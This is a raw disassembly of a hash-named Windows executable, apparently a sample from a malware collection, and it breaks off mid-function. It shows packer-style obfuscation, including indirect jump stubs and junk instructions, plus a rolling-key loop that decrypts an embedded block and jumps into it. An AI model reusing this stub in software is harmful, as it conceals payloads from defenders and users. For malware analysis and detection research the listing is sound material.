
200c4ccb91745ff985f03096a0f4eab084a36565505805a82600ab774963253b.exe:     file format pei-i386


Disassembly of section .text:

004cd000 <.text>:
  4cd000:	pop    edi
  4cd001:	xor    eax,eax
  4cd003:	call   DWORD PTR [eax*8+0x4cf758]
  4cd00a:	push   edi
  4cd00b:	pop    edi
  4cd00c:	jmp    DWORD PTR [esp-0x4]
  4cd010:	mov    edi,edi
  4cd012:	push   ebp
  4cd013:	mov    ebp,esp
  4cd015:	sub    esp,0x38
  4cd018:	lea    eax,ds:0x4d00bc
  4cd01e:	adc    ecx,esi
  4cd020:	push   eax
  4cd021:	push   ecx
  4cd022:	push   DWORD PTR [eax+0xf0]
  4cd028:	push   DWORD PTR [eax+0x78]
  4cd02b:	push   esi
  4cd02c:	call   0x4cd9d0
  4cd031:	add    esp,0x10
  4cd034:	pop    eax
  4cd035:	push   eax
  4cd036:	call   0x4cd584
  4cd03b:	pop    eax
  4cd03c:	push   eax
  4cd03d:	push   0x0
  4cd03f:	call   0x4cdad4
  4cd044:	pop    eax
  4cd045:	add    esp,0x38
  4cd048:	pop    ebp
  4cd049:	ret    
  4cd04a:	add    BYTE PTR [eax],al
  4cd04c:	pop    edi
  4cd04d:	xor    eax,eax
  4cd04f:	call   DWORD PTR [eax*8+0x4cf728]
  4cd056:	push   edi
  4cd057:	pop    edi
  4cd058:	jmp    DWORD PTR [esp-0x4]
  4cd05c:	mov    edi,edi
  4cd05e:	push   ebp
  4cd05f:	mov    ebp,esp
  4cd061:	sub    esp,0x28
  4cd064:	lea    ebx,ds:0x4d00f0
  4cd06a:	sub    ecx,0x1
  4cd06d:	call   0x4cd584
  4cd072:	push   ebx
  4cd073:	push   eax
  4cd074:	push   DWORD PTR [ebx+0x1b4]
  4cd07a:	push   DWORD PTR [ebx+0xd0]
  4cd080:	push   DWORD PTR [ebx+0x58]
  4cd083:	call   0x4cd130
  4cd088:	add    esp,0x10
  4cd08b:	pop    ebx
  4cd08c:	call   0x4cdae4
  4cd091:	add    esp,0x28
  4cd094:	pop    ebp
  4cd095:	ret    
  4cd096:	add    BYTE PTR [eax],al
  4cd098:	mov    edi,edi
  4cd09a:	push   ebp
  4cd09b:	mov    ebp,esp
  4cd09d:	sub    esp,0x4c
  4cd0a0:	mov    DWORD PTR [ebp-0x8],0xfffff4b7
  4cd0a7:	lea    ecx,[edi+0x98]
  4cd0ad:	push   ecx
  4cd0ae:	mov    edi,0x6a8
  4cd0b3:	push   edi
  4cd0b4:	push   0x6a8
  4cd0b9:	push   0x40001
  4cd0be:	mov    ebx,0x86295c7a
  4cd0c3:	push   DWORD PTR [ebx+0x7a239a86]
  4cd0c9:	sub    DWORD PTR [esp],0x2
  4cd0cd:	mov    ebx,0x4cf710
  4cd0d2:	pop    DWORD PTR [ebx]
  4cd0d4:	call   0x4cdcdc
  4cd0d9:	xchg   DWORD PTR [esp],eax
  4cd0dc:	mov    ecx,eax
  4cd0de:	pop    DWORD PTR [ecx-0xe8]
  4cd0e4:	mov    edi,DWORD PTR [ecx-0xe8]
  4cd0ea:	mov    eax,edi
  4cd0ec:	sub    ebx,ebx
  4cd0ee:	dec    ebx
  4cd0ef:	and    ebx,0x4cf038
  4cd0f5:	mov    edi,0x631a7e54
  4cd0fa:	xor    esi,esi
  4cd0fc:	add    esi,0x6a8
  4cd102:	test   esi,esi
  4cd104:	je     0x4cd122
  4cd106:	add    esi,0xfffffffc
  4cd109:	xor    edx,edx
  4cd10b:	push   DWORD PTR [ebx+edx*1]
  4cd10e:	sub    DWORD PTR [esp],edi
  4cd111:	pop    DWORD PTR [eax+edx*2]
  4cd114:	dec    DWORD PTR [eax]
  4cd116:	xor    edi,edi
  4cd118:	add    edi,DWORD PTR [ebx]
  4cd11a:	add    ebx,0x4
  4cd11d:	add    eax,0x4
  4cd120:	jmp    0x4cd102
  4cd122:	push   ecx
  4cd123:	push   0x0
  4cd125:	call   0x4cd468
  4cd12a:	pop    ecx
  4cd12b:	add    esp,0x4c
  4cd12e:	pop    ebp
  4cd12f:	ret    
  4cd130:	mov    edi,edi
  4cd132:	push   ebp
  4cd133:	mov    ebp,esp
  4cd135:	sub    esp,0x24
  4cd138:	lea    edi,[ebx+0xd4]
  4cd13e:	mov    DWORD PTR [ebp-0x20],eax
  4cd141:	push   edi
  4cd142:	push   DWORD PTR [edi+0xe4]
  4cd148:	push   edx
  4cd149:	push   DWORD PTR [edi+0x1b4]
  4cd14f:	call   0x4cd2a0
  4cd154:	add    esp,0xc
  4cd157:	pop    edi
  4cd158:	push   edi
  4cd159:	call   0x4cd04c
  4cd15e:	pop    edi
  4cd15f:	push   edi
  4cd160:	mov    eax,0x0
  4cd165:	push   eax
  4cd166:	call   0x4cd574
  4cd16b:	pop    edi
  4cd16c:	add    esp,0x24
  4cd16f:	pop    ebp
  4cd170:	ret    
  4cd171:	add    BYTE PTR [eax],al
  4cd173:	add    BYTE PTR [ebx-0x1374aa01],cl
  4cd179:	sub    esp,0x30
  4cd17c:	mov    ecx,0x4d00c4
  4cd181:	sbb    edx,DWORD PTR [ecx+0x108]
  4cd187:	push   ecx
  4cd188:	call   0x4cd04c
  4cd18d:	pop    ecx
  4cd18e:	push   ecx
  4cd18f:	push   DWORD PTR [ecx+0x1e8]
  4cd195:	push   eax
  4cd196:	call   0x4cda54
  4cd19b:	add    esp,0x8
  4cd19e:	pop    ecx
  4cd19f:	mov    edi,0x4cf70c
  4cd1a4:	mov    edi,DWORD PTR [edi]
  4cd1a6:	push   edi
  4cd1a7:	push   DWORD PTR [ecx-0x94]
  4cd1ad:	pop    eax
  4cd1ae:	call   eax
  4cd1b0:	add    esp,0x30
  4cd1b3:	pop    ebp
  4cd1b4:	ret    
  4cd1b5:	add    BYTE PTR [eax],al
  4cd1b7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4cd1bd:	sub    esp,0x48
  4cd1c0:	lea    edx,[ecx+0x154]
  4cd1c6:	sbb    DWORD PTR [edx+0x3c],ebx
  4cd1c9:	push   edx
  4cd1ca:	lea    ebx,[edx-0x1a0]
  4cd1d0:	push   ebx
  4cd1d1:	call   0x4ce050
  4cd1d6:	test   eax,eax
  4cd1d8:	jne    0x4cd1ca
  4cd1da:	pop    edx
  4cd1db:	push   edx
  4cd1dc:	push   eax
  4cd1dd:	push   DWORD PTR [edx+0x1e0]
  4cd1e3:	push   edi
  4cd1e4:	call   0x4cdee8
  4cd1e9:	add    esp,0xc
  4cd1ec:	pop    edx
  4cd1ed:	push   edx
  4cd1ee:	lea    edi,[edx-0x1a0]
  4cd1f4:	push   edi
  4cd1f5:	call   0x4ce050
  4cd1fa:	test   eax,eax
  4cd1fc:	jne    0x4cd1ee
  4cd1fe:	pop    edx
  4cd1ff:	add    esp,0x48
  4cd202:	pop    ebp
  4cd203:	ret    
  4cd204:	mov    edi,edi
  4cd206:	push   ebp
  4cd207:	mov    ebp,esp
  4cd209:	sub    esp,0x30
  4cd20c:	lea    edi,ds:0x4d015c
  4cd212:	sbb    DWORD PTR [edi-0xc4],0x6b32
  4cd21c:	push   edi
  4cd21d:	push   ecx
  4cd21e:	push   ebx
  4cd21f:	call   0x4cd778
  4cd224:	add    esp,0x8
  4cd227:	pop    edi
  4cd228:	push   edi
  4cd229:	push   0xfffffff4
  4cd22b:	call   0x4cd618
  4cd230:	pop    edi
  4cd231:	push   edi
  4cd232:	mov    edx,0x0
  4cd237:	push   edx
  4cd238:	call   0x4cd574
  4cd23d:	pop    edi
  4cd23e:	add    esp,0x30
  4cd241:	pop    ebp
  4cd242:	ret    
  4cd243:	add    BYTE PTR [edi+0x33],bl
  4cd246:	sar    bh,0x14
  4cd249:	lds    eax,FWORD PTR [eax+0x57004cf7]
  4cd24f:	pop    edi
  4cd250:	jmp    DWORD PTR [esp-0x4]
  4cd254:	mov    edi,edi
  4cd256:	push   ebp
  4cd257:	mov    ebp,esp
  4cd259:	sub    esp,0x50
  4cd25c:	lea    ebx,ds:0x4d017c
  4cd262:	cmp    ebx,0x488c
  4cd268:	jbe    0x4cd257
  4cd26a:	mov    ecx,0xfffffff4
  4cd26f:	push   ecx
  4cd270:	call   0x4cd618
  4cd275:	push   ebx
  4cd276:	push   DWORD PTR [ebx+0x11c]
  4cd27c:	push   DWORD PTR [ebx+0x8c]
  4cd282:	push   esi
  4cd283:	push   DWORD PTR [ebx+0x13c]
  4cd289:	call   0x4cd3e8
  4cd28e:	add    esp,0x10
  4cd291:	pop    ebx
  4cd292:	push   0x0
  4cd294:	call   0x4cdad4
  4cd299:	add    esp,0x50
  4cd29c:	pop    ebp
  4cd29d:	ret    
  4cd29e:	add    BYTE PTR [eax],al
  4cd2a0:	mov    edi,edi
  4cd2a2:	push   ebp
  4cd2a3:	mov    ebp,esp
  4cd2a5:	sub    esp,0x34
  4cd2a8:	lea    ebx,ds:0x4d012c
  4cd2ae:	add    DWORD PTR [ebx-0xd0],edi
  4cd2b4:	push   0x0
  4cd2b6:	call   0x4cd468
  4cd2bb:	push   ebx
  4cd2bc:	push   ecx
  4cd2bd:	push   esi
  4cd2be:	push   edx
  4cd2bf:	call   0x4cd2e4
  4cd2c4:	add    esp,0xc
  4cd2c7:	pop    ebx
  4cd2c8:	push   0x0
  4cd2ca:	call   0x4cdfb4
  4cd2cf:	add    esp,0x34
  4cd2d2:	pop    ebp
  4cd2d3:	ret    
  4cd2d4:	pop    edi
  4cd2d5:	xor    eax,eax
  4cd2d7:	call   DWORD PTR [eax*8+0x4cf750]
  4cd2de:	push   edi
  4cd2df:	pop    edi
  4cd2e0:	jmp    DWORD PTR [esp-0x4]
  4cd2e4:	mov    edi,edi
  4cd2e6:	push   ebp
  4cd2e7:	mov    ebp,esp
  4cd2e9:	sub    esp,0x50
  4cd2ec:	lea    edx,ds:0x4d014c
  4cd2f2:	and    ebx,DWORD PTR [edx-0x68]
  4cd2f5:	push   edx
  4cd2f6:	push   0x0
  4cd2f8:	call   0x4cdfb4
  4cd2fd:	pop    edx
  4cd2fe:	push   edx
  4cd2ff:	push   DWORD PTR [edx+0x12c]
  4cd305:	push   DWORD PTR [edx+0x8c]
  4cd30b:	push   DWORD PTR [edx+0x1a8]
  4cd311:	call   0x4cd32c
  4cd316:	add    esp,0xc
  4cd319:	pop    edx
  4cd31a:	push   edx
  4cd31b:	mov    eax,0x0
  4cd320:	push   eax
  4cd321:	call   0x4cd468
  4cd326:	pop    edx
  4cd327:	add    esp,0x50
  4cd32a:	pop    ebp
  4cd32b:	ret    
  4cd32c:	mov    edi,edi
  4cd32e:	push   ebp
  4cd32f:	mov    ebp,esp
  4cd331:	sub    esp,0x30
  4cd334:	mov    ebx,0x4d0104
  4cd339:	sbb    DWORD PTR [ebp-0x18],0xffffffbc
  4cd33d:	push   ebx
  4cd33e:	push   DWORD PTR [ebx+0x78]
  4cd341:	push   DWORD PTR [ebx+0x11c]
  4cd347:	push   eax
  4cd348:	call   0x4cd648
  4cd34d:	add    esp,0xc
  4cd350:	pop    ebx
  4cd351:	mov    edi,0x0
  4cd356:	push   edi
  4cd357:	call   0x4cdf64
  4cd35c:	call   0x4cd584
  4cd361:	add    esp,0x30
  4cd364:	pop    ebp
  4cd365:	ret    
  4cd366:	add    BYTE PTR [eax],al
  4cd368:	mov    edi,edi
  4cd36a:	push   ebp
  4cd36b:	mov    ebp,esp
  4cd36d:	sub    esp,0x44
  4cd370:	lea    ecx,ds:0x4d0168
  4cd376:	sub    eax,0xffffff84
  4cd379:	push   ecx
  4cd37a:	push   0x0
  4cd37c:	call   0x4cd7d0
  4cd381:	pop    ecx
  4cd382:	push   ecx
  4cd383:	push   DWORD PTR [ecx+0x70]
  4cd386:	push   DWORD PTR [ecx+0x38]
  4cd389:	push   edx
  4cd38a:	call   0x4cde2c
  4cd38f:	add    esp,0xc
  4cd392:	pop    ecx
  4cd393:	push   ecx
  4cd394:	push   0x0
  4cd396:	call   0x4cd574
  4cd39b:	pop    ecx
  4cd39c:	add    esp,0x44
  4cd39f:	pop    ebp
  4cd3a0:	ret    
  4cd3a1:	add    BYTE PTR [eax],al
  4cd3a3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4cd3a9:	sub    esp,0x30
  4cd3ac:	lea    edx,[esi+0xec]
  4cd3b2:	add    eax,DWORD PTR [edx-0x124]
  4cd3b8:	push   edx
  4cd3b9:	push   DWORD PTR [edx+0x10]
  4cd3bc:	push   ecx
  4cd3bd:	call   0x4cd874
  4cd3c2:	add    esp,0x8
  4cd3c5:	pop    edx
  4cd3c6:	push   edx
  4cd3c7:	mov    ebx,0x0
  4cd3cc:	push   ebx
  4cd3cd:	call   0x4cdfb4
  4cd3d2:	pop    edx
  4cd3d3:	push   edx
  4cd3d4:	mov    eax,0x0
  4cd3d9:	push   eax
  4cd3da:	call   0x4cdf64
  4cd3df:	pop    edx
  4cd3e0:	add    esp,0x30
  4cd3e3:	pop    ebp
  4cd3e4:	ret    
  4cd3e5:	add    BYTE PTR [eax],al
  4cd3e7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4cd3ed:	sub    esp,0x30
  4cd3f0:	lea    ecx,ds:0x4d01e4
  4cd3f6:	or     DWORD PTR [ecx-0x108],edx
  4cd3fc:	push   ecx
  4cd3fd:	push   0x0
  4cd3ff:	call   0x4cdd90
  4cd404:	pop    ecx
  4cd405:	push   ecx
  4cd406:	push   edx
  4cd407:	push   DWORD PTR [ecx+0x188]
  4cd40d:	call   0x4cda14
  4cd412:	add    esp,0x8
  4cd415:	pop    ecx
  4cd416:	push   ecx
  4cd417:	push   0x0
  4cd419:	call   0x4cdf64
  4cd41e:	pop    ecx
  4cd41f:	add    esp,0x30
  4cd422:	pop    ebp
  4cd423:	ret    
  4cd424:	mov    edi,edi
  4cd426:	push   ebp
  4cd427:	mov    ebp,esp
  4cd429:	sub    esp,0x58
  4cd42c:	lea    edi,ds:0x4d0060
  4cd432:	adc    esi,DWORD PTR [edi+0x60]
  4cd435:	push   edi
  4cd436:	push   DWORD PTR [edi+0x30]
  4cd439:	push   ecx
  4cd43a:	push   ebx
  4cd43b:	push   esi
  4cd43c:	call   0x4cd05c
  4cd441:	add    esp,0x10
  4cd444:	pop    edi
  4cd445:	push   edi
  4cd446:	lea    esi,[edi-0x60]
  4cd449:	push   esi
  4cd44a:	call   0x4ce050
  4cd44f:	test   eax,eax
  4cd451:	jne    0x4cd446
  4cd453:	pop    edi
  4cd454:	push   edi
  4cd455:	mov    ebx,0x0
  4cd45a:	push   ebx
  4cd45b:	call   0x4cdf64
  4cd460:	pop    edi
  4cd461:	add    esp,0x58
  4cd464:	pop    ebp
  4cd465:	ret    
  4cd466:	add    BYTE PTR [eax],al
  4cd468:	pop    edi
  4cd469:	xor    eax,eax
  4cd46b:	call   DWORD PTR [eax*8+0x4cf724]
  4cd472:	push   edi
  4cd473:	pop    edi
  4cd474:	jmp    DWORD PTR [esp-0x4]
  4cd478:	pop    edi
  4cd479:	xor    eax,eax
  4cd47b:	call   DWORD PTR [eax*8+0x4cf71c]
  4cd482:	push   edi
  4cd483:	pop    edi
  4cd484:	jmp    DWORD PTR [esp-0x4]
  4cd488:	mov    edi,edi
  4cd48a:	push   ebp
  4cd48b:	mov    ebp,esp
  4cd48d:	sub    esp,0x2c
  4cd490:	lea    edi,ds:0x4d0018
  4cd496:	sub    DWORD PTR [ebp-0x8],0x346f
  4cd49d:	push   edi
  4cd49e:	mov    eax,0x0
  4cd4a3:	push   eax
  4cd4a4:	call   0x4cdfb4
  4cd4a9:	pop    edi
  4cd4aa:	push   edi
  4cd4ab:	push   esi
  4cd4ac:	push   ecx
  4cd4ad:	push   edx
  4cd4ae:	push   DWORD PTR [edi+0x114]
  4cd4b4:	call   0x4cdf74
  4cd4b9:	add    esp,0x10
  4cd4bc:	pop    edi
  4cd4bd:	push   edi
  4cd4be:	mov    edx,0x0
  4cd4c3:	push   edx
  4cd4c4:	call   0x4cdd90
  4cd4c9:	pop    edi
  4cd4ca:	add    esp,0x2c
  4cd4cd:	pop    ebp
  4cd4ce:	ret    
  4cd4cf:	add    BYTE PTR [ebx-0x1374aa01],cl
  4cd4d5:	sub    esp,0x4c
  4cd4d8:	lea    edi,ds:0x4d0080
  4cd4de:	add    ebx,0xffffdd3f
  4cd4e4:	push   edi
  4cd4e5:	push   0x0
  4cd4e7:	call   0x4cdf64
  4cd4ec:	pop    edi
  4cd4ed:	push   edi
  4cd4ee:	push   ebx
  4cd4ef:	push   edx
  4cd4f0:	push   DWORD PTR [edi+0x84]
  4cd4f6:	call   0x4cd098
  4cd4fb:	add    esp,0xc
  4cd4fe:	pop    edi
  4cd4ff:	push   edi
  4cd500:	push   0x0
  4cd502:	call   0x4cd864
  4cd507:	pop    edi
  4cd508:	add    esp,0x4c
  4cd50b:	pop    ebp
  4cd50c:	ret    
  4cd50d:	add    BYTE PTR [eax],al
  4cd50f:	add    BYTE PTR [edi+0x33],bl
  4cd512:	sar    bh,0x14
  4cd515:	lds    ebx,FWORD PTR [eax]
  4cd517:	test   DWORD PTR [eax+eax*1+0x57],0x2464ff5f
  4cd51f:	cld    
  4cd520:	pop    edi
  4cd521:	xor    eax,eax
  4cd523:	call   DWORD PTR [eax*8+0x4cf754]
  4cd52a:	push   edi
  4cd52b:	pop    edi
  4cd52c:	jmp    DWORD PTR [esp-0x4]
  4cd530:	pop    edi
  4cd531:	xor    eax,eax
  4cd533:	call   DWORD PTR [eax*8+0x4cf730]
  4cd53a:	push   edi
  4cd53b:	pop    edi
  4cd53c:	jmp    DWORD PTR [esp-0x4]
  4cd540:	mov    edi,edi
  4cd542:	push   ebp
  4cd543:	mov    ebp,esp
  4cd545:	sub    esp,0x4c
  4cd548:	lea    ecx,[ebx-0x174]
  4cd54e:	adc    esi,DWORD PTR [ebp-0x20]
  4cd551:	push   ecx
  4cd552:	call   0x4cd530
  4cd557:	pop    ecx
  4cd558:	push   ecx
  4cd559:	push   edx
  4cd55a:	push   DWORD PTR [ecx]
  4cd55c:	call   0x4cd6c8
  4cd561:	add    esp,0x8
  4cd564:	pop    ecx
  4cd565:	push   ecx
  4cd566:	push   0x0
  4cd568:	call   0x4cdd90
  4cd56d:	pop    ecx
  4cd56e:	add    esp,0x4c
  4cd571:	pop    ebp
  4cd572:	ret    
  4cd573:	add    BYTE PTR [edi+0x33],bl
  4cd576:	sar    bh,0x14
  4cd579:	lds    ecx,FWORD PTR [eax-0x9]
  4cd57c:	dec    esp
  4cd57d:	add    BYTE PTR [edi+0x5f],dl
  4cd580:	jmp    DWORD PTR [esp-0x4]
  4cd584:	pop    edi
  4cd585:	xor    eax,eax
  4cd587:	call   DWORD PTR [eax*8+0x4cf720]
  4cd58e:	push   edi
  4cd58f:	pop    edi
  4cd590:	jmp    DWORD PTR [esp-0x4]
  4cd594:	mov    edi,edi
  4cd596:	push   ebp
  4cd597:	mov    ebp,esp
  4cd599:	sub    esp,0x58
  4cd59c:	lea    esi,[ebx-0x188]
  4cd5a2:	sub    edi,DWORD PTR [esi+0x14c]
  4cd5a8:	mov    ecx,0x0
  4cd5ad:	push   ecx
  4cd5ae:	call   0x4cd7d0
  4cd5b3:	push   esi
  4cd5b4:	push   edi
  4cd5b5:	push   DWORD PTR [esi+0x44]
  4cd5b8:	push   ecx
  4cd5b9:	call   0x4cd4d0
  4cd5be:	add    esp,0xc
  4cd5c1:	pop    esi
  4cd5c2:	push   0x0
  4cd5c4:	call   0x4cd864
  4cd5c9:	add    esp,0x58
  4cd5cc:	pop    ebp
  4cd5cd:	ret    
  4cd5ce:	add    BYTE PTR [eax],al
  4cd5d0:	push   edi
  4cd5d1:	xor    edi,edi
  4cd5d3:	push   edi
  4cd5d4:	push   edi
  4cd5d5:	push   edi
  4cd5d6:	push   edi
  4cd5d7:	call   0x4cd618
  4cd5dc:	sub    esp,0x4
  4cd5df:	call   0x4cd628
  4cd5e4:	push   0x2
  4cd5e6:	xor    eax,eax
  4cd5e8:	xor    eax,0x4d00a0
  4cd5ed:	push   0x0
  4cd5ef:	inc    DWORD PTR ds:0x4d00a6
  4cd5f5:	push   eax
  4cd5f6:	call   0x4cdcdc
  4cd5fb:	pop    edi
  4cd5fc:	lea    edi,[eax+0x3b]
  4cd5ff:	mov    edi,DWORD PTR [edi]
  4cd601:	lea    eax,[eax+edi*1]
  4cd604:	add    eax,0x28
  4cd607:	mov    eax,DWORD PTR [eax]
  4cd609:	pusha  
  4cd60a:	mov    ah,0x30
  4cd60c:	sub    al,ah
  4cd60e:	jb     0x4cd616
  4cd610:	jg     0x4cd174
  4cd616:	popa   
  4cd617:	ret    
  4cd618:	pop    edi
  4cd619:	xor    eax,eax
  4cd61b:	call   DWORD PTR [eax*8+0x4cf6e8]
  4cd622:	push   edi
  4cd623:	pop    edi
  4cd624:	jmp    DWORD PTR [esp-0x4]
  4cd628:	pop    edi
  4cd629:	xor    eax,eax
  4cd62b:	call   DWORD PTR [eax*8+0x4cf704]
  4cd632:	push   edi
  4cd633:	pop    edi
  4cd634:	jmp    DWORD PTR [esp-0x4]
  4cd638:	pop    edi
  4cd639:	xor    eax,eax
  4cd63b:	call   DWORD PTR [eax*8+0x4cf76c]
  4cd642:	push   edi
  4cd643:	pop    edi
  4cd644:	jmp    DWORD PTR [esp-0x4]
  4cd648:	mov    edi,edi
  4cd64a:	push   ebp
  4cd64b:	mov    ebp,esp
  4cd64d:	sub    esp,0x50
  4cd650:	lea    edi,[ebx+0xa8]
  4cd656:	adc    esi,eax
  4cd658:	push   edi
  4cd659:	call   0x4cd04c
  4cd65e:	pop    edi
  4cd65f:	push   edi
  4cd660:	push   DWORD PTR [edi+0xcc]
  4cd666:	push   esi
  4cd667:	call   0x4cd828
  4cd66c:	add    esp,0x8
  4cd66f:	pop    edi
  4cd670:	push   edi
  4cd671:	mov    edi,0x0
  4cd676:	push   edi
  4cd677:	call   0x4cdfb4
  4cd67c:	pop    edi
  4cd67d:	add    esp,0x50
  4cd680:	pop    ebp
  4cd681:	ret    
  4cd682:	add    BYTE PTR [eax],al
  4cd684:	mov    edi,edi
  4cd686:	push   ebp
  4cd687:	mov    ebp,esp
  4cd689:	sub    esp,0x38
  4cd68c:	lea    ebx,ds:0x4d0154
  4cd692:	add    edx,DWORD PTR [ebx+0x34]
  4cd695:	push   ebx
  4cd696:	push   DWORD PTR [ebx+0xc8]
  4cd69c:	push   esi
  4cd69d:	push   DWORD PTR [ebx+0x1c0]
  4cd6a3:	push   DWORD PTR [ebx+0xd0]
  4cd6a9:	call   0x4cdb40
  4cd6ae:	add    esp,0x10
  4cd6b1:	pop    ebx
  4cd6b2:	call   0x4cd04c
  4cd6b7:	mov    edi,0x0
  4cd6bc:	push   edi
  4cd6bd:	call   0x4cdd90
  4cd6c2:	add    esp,0x38
  4cd6c5:	pop    ebp
  4cd6c6:	ret    
  4cd6c7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4cd6cd:	sub    esp,0x5c
  4cd6d0:	lea    edx,ds:0x4d00f8
  4cd6d6:	mov    DWORD PTR [edx-0x60],0x1f
  4cd6dd:	push   edx
  4cd6de:	push   0x0
  4cd6e0:	call   0x4cd574
  4cd6e5:	pop    edx
  4cd6e6:	push   edx
  4cd6e7:	push   eax
  4cd6e8:	push   esi
  4cd6e9:	call   0x4cdcec
  4cd6ee:	add    esp,0x8
  4cd6f1:	pop    edx
  4cd6f2:	push   edx
  4cd6f3:	mov    edi,0x0
  4cd6f8:	push   edi
  4cd6f9:	call   0x4cd864
  4cd6fe:	pop    edx
  4cd6ff:	add    esp,0x5c
  4cd702:	pop    ebp
  4cd703:	ret    
  4cd704:	mov    edi,edi
  4cd706:	push   ebp
  4cd707:	mov    ebp,esp
  4cd709:	sub    esp,0x4c
  4cd70c:	mov    ecx,0x4d01f0
  4cd711:	xor    DWORD PTR [ebp-0x40],0x18
  4cd715:	push   ecx
  4cd716:	push   0x0
  4cd718:	call   0x4cdfb4
  4cd71d:	pop    ecx
  4cd71e:	push   ecx
  4cd71f:	push   esi
  4cd720:	push   edi
  4cd721:	push   eax
  4cd722:	call   0x4cdb04
  4cd727:	add    esp,0xc
  4cd72a:	pop    ecx
  4cd72b:	push   ecx
  4cd72c:	call   0x4cd584
  4cd731:	pop    ecx
  4cd732:	add    esp,0x4c
  4cd735:	pop    ebp
  4cd736:	ret    
  4cd737:	add    BYTE PTR [edi+0x33],bl
  4cd73a:	sar    bh,0x14
  4cd73d:	lds    ecx,FWORD PTR [eax]
  4cd73f:	test   DWORD PTR [eax+eax*1+0x57],0x2464ff5f
  4cd747:	cld    
  4cd748:	pop    edi
  4cd749:	xor    eax,eax
  4cd74b:	call   DWORD PTR [eax*8+0x4cf77c]
  4cd752:	push   edi
  4cd753:	pop    edi
  4cd754:	jmp    DWORD PTR [esp-0x4]
  4cd758:	pop    edi
  4cd759:	xor    eax,eax
  4cd75b:	call   DWORD PTR [eax*8+0x4cf768]
  4cd762:	push   edi
  4cd763:	pop    edi
  4cd764:	jmp    DWORD PTR [esp-0x4]
  4cd768:	pop    edi
  4cd769:	xor    eax,eax
  4cd76b:	call   DWORD PTR [eax*8+0x4cf784]
  4cd772:	push   edi
  4cd773:	pop    edi
  4cd774:	jmp    DWORD PTR [esp-0x4]
  4cd778:	mov    edi,edi
  4cd77a:	push   ebp
  4cd77b:	mov    ebp,esp
  4cd77d:	sub    esp,0x54
  4cd780:	mov    ecx,0x4d017c
  4cd785:	xor    ebx,0xffffbc76
  4cd78b:	push   ecx
  4cd78c:	push   DWORD PTR [ecx+0x160]
  4cd792:	push   DWORD PTR [ecx+0x1fc]
  4cd798:	push   edi
  4cd799:	call   0x4cdc50
  4cd79e:	add    esp,0xc
  4cd7a1:	pop    ecx
  4cd7a2:	push   ecx
  4cd7a3:	mov    ebx,0x0
  4cd7a8:	push   ebx
  4cd7a9:	call   0x4cd864
  4cd7ae:	pop    ecx
  4cd7af:	push   ecx
  4cd7b0:	push   0xfffffff4
  4cd7b2:	call   0x4cd618
  4cd7b7:	pop    ecx
  4cd7b8:	add    esp,0x54
  4cd7bb:	pop    ebp
  4cd7bc:	ret    
  4cd7bd:	add    BYTE PTR [eax],al
  4cd7bf:	add    BYTE PTR [edi+0x33],bl
  4cd7c2:	sar    bh,0x14
  4cd7c5:	lds    esi,FWORD PTR [eax-0x9]
  4cd7c8:	dec    esp
  4cd7c9:	add    BYTE PTR [edi+0x5f],dl
  4cd7cc:	jmp    DWORD PTR [esp-0x4]
  4cd7d0:	pop    edi
  4cd7d1:	xor    eax,eax
  4cd7d3:	call   DWORD PTR [eax*8+0x4cf740]
  4cd7da:	push   edi
  4cd7db:	pop    edi
  4cd7dc:	jmp    DWORD PTR [esp-0x4]
  4cd7e0:	mov    edi,edi
  4cd7e2:	push   ebp
  4cd7e3:	mov    ebp,esp
  4cd7e5:	sub    esp,0x40
  4cd7e8:	lea    edi,ds:0x4d01dc
  4cd7ee:	sbb    DWORD PTR [edi-0x7c],0xffffaccf
  4cd7f5:	push   edi
  4cd7f6:	mov    edi,0x0
  4cd7fb:	push   edi
  4cd7fc:	call   0x4cdad4
  4cd801:	pop    edi
  4cd802:	push   edi
  4cd803:	push   ebx
  4cd804:	push   ecx
  4cd805:	push   DWORD PTR [edi+0x68]
  4cd808:	push   DWORD PTR [edi+0xd0]
  4cd80e:	call   0x4cd368
  4cd813:	add    esp,0x10
  4cd816:	pop    edi
  4cd817:	push   edi
  4cd818:	push   0x0
  4cd81a:	call   0x4cd864
  4cd81f:	pop    edi
  4cd820:	add    esp,0x40
  4cd823:	pop    ebp
  4cd824:	ret    
  4cd825:	add    BYTE PTR [eax],al
  4cd827:	add    BYTE PTR [ebx-0x1374aa01],cl
  4cd82d:	sub    esp,0x28
  4cd830:	lea    eax,[edi-0x158]
  4cd836:	sub    DWORD PTR [eax+0x150],ecx
  4cd83c:	push   eax
  4cd83d:	call   0x4cd584
  4cd842:	pop    eax
  4cd843:	push   eax
  4cd844:	push   ebx
  4cd845:	push   ecx
  4cd846:	push   DWORD PTR [eax+0x9c]
  4cd84c:	push   edx
  4cd84d:	call   0x4cdca4
  4cd852:	add    esp,0x10
  4cd855:	pop    eax
  4cd856:	push   eax
  4cd857:	push   0x0
  4cd859:	call   0x4cdfb4
  4cd85e:	pop    eax
  4cd85f:	add    esp,0x28
  4cd862:	pop    ebp
  4cd863:	ret    
  4cd864:	pop    edi
  4cd865:	xor    eax,eax
  4cd867:	call   DWORD PTR [eax*8+0x4cf6f0]
  4cd86e:	push   edi
  4cd86f:	pop    edi
  4cd870:	jmp    DWORD PTR [esp-0x4]
  4cd874:	mov    edi,edi
  4cd876:	push   ebp
  4cd877:	mov    ebp,esp
  4cd879:	sub    esp,0x5c
  4cd87c:	lea    edi,ds:0x4d0064
  4cd882:	sbb    ecx,DWORD PTR [edi+0x20]
  4cd885:	push   edi
  4cd886:	mov    edi,0x0
  4cd88b:	push   edi
  4cd88c:	call   0x4cd864
  4cd891:	pop    edi
  4cd892:	push   edi
  4cd893:	push   ecx
  4cd894:	push   DWORD PTR [edi+0x118]
  4cd89a:	call   0x4cd98c
  4cd89f:	add    esp,0x8
  4cd8a2:	pop    edi
  4cd8a3:	push   edi
  4cd8a4:	call   0x4cd04c
  4cd8a9:	pop    edi
  4cd8aa:	add    esp,0x5c
  4cd8ad:	pop    ebp
  4cd8ae:	ret    
  4cd8af:	add    BYTE PTR [ebx-0x1374aa01],cl
  4cd8b5:	sub    esp,0x54
  4cd8b8:	lea    esi,ds:0x4d0064
  4cd8be:	sub    DWORD PTR [esi+0x2c],0x36
  4cd8c2:	push   0xfffffff4
  4cd8c4:	call   0x4cd618
  4cd8c9:	push   esi
  4cd8ca:	push   DWORD PTR [esi+0xe8]
  4cd8d0:	push   DWORD PTR [esi+0x1a0]
  4cd8d6:	push   eax
